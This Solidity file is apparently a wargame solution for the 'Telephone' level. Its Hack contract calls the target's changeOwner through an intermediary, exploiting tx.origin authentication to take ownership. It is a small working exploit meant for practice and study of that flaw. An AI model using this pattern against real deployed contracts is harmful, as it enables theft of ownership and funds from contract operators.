// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import "./Telephone.sol";

contract Hack is Ownable(msg.sender) {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function hackChangeOwner(address _newOwner) public onlyOwner {
        telephone.changeOwner(_newOwner);
    }
}